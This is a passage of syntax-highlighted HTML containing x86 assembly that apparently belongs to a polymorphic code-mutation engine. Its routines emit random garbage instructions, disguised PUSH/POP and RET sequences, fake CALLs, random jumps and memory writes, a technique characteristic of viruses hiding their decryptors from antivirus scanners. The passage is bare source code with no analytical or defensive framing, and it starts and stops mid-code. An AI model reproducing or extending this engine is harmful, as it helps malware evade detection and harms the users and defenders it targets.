                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">store_correct</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Load aux reg with displacement</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get a valid auxiliary register</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">load_aux</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Move displacement into aux reg</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate push reg + garbage + pop reg</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g_push_g_pop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">skip_sp_push</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_with_sp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">from_push</span><span class="sc0">

</span><span class="sc5">skip_sp_push</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

</span><span class="sc5">from_push</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">pop_with_sp</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Emulate a PUSH instruction, using SUB ESP,00000004h</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">push_with_sp</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0004EC83h</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Emulate a POP instruction, using ADD ESP,00000004h</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">pop_with_sp</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0004C483h</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate RET in different ways</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_ret</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">just_ret</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E0FFh</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">just_ret</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate CALL without return</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g_call_cont</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">pop_with_sp</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate unconditional jumps</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g_jump_u</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_save_jump</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate conditional jumps</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g_jump_c</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_save_jump_c</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate MOV [mem],reg</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_mov_mem8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">88h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mem8wr</span><span class="sc0">
</span><span class="sc5">gen_mov_mem16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">gen_mov_mem32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">89h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gen_mem_wr</span><span class="sc0">

</span><span class="sc5">gen_add_mem8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mem8wr</span><span class="sc0">
</span><span class="sc5">gen_add_mem16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">gen_add_mem32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gen_mem_wr</span><span class="sc0">

</span><span class="sc5">gen_sub_mem8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mem8wr</span><span class="sc0">
</span><span class="sc5">gen_sub_mem16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">gen_sub_mem32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gen_mem_wr</span><span class="sc0">

</span><span class="sc5">gen_adc_mem8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mem8wr</span><span class="sc0">
</span><span class="sc5">gen_adc_mem16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">gen_adc_mem32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gen_mem_wr</span><span class="sc0">

</span><span class="sc5">gen_sbb_mem8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mem8wr</span><span class="sc0">
</span><span class="sc5">gen_sbb_mem16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">gen_sbb_mem32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gen_mem_wr</span><span class="sc0">

</span><span class="sc5">gen_or_mem8</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mem8wr</span><span class="sc0">
</span><span class="sc5">gen_or_mem16</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">gen_or_mem32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gen_mem_wr</span><span class="sc0">

</span><span class="sc5">gen_and_mem8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mem8wr</span><span class="sc0">
</span><span class="sc5">gen_and_mem16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">gen_and_mem32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gen_mem_wr</span><span class="sc0">

</span><span class="sc5">gen_xor_mem8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mem8wr</span><span class="sc0">
</span><span class="sc5">gen_xor_mem16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">gen_xor_mem32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gen_mem_wr</span><span class="sc0">

</span><span class="sc5">mem8wr</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_mem_wr</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">00000005h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">gen_mem_wr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">skip_wr_eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">88h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">gen_mem_wr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">89h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">gen_mem_wr</span><span class="sc0">

</span><span class="sc5">skip_wr_eax</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfDataAreas</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_data_area</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
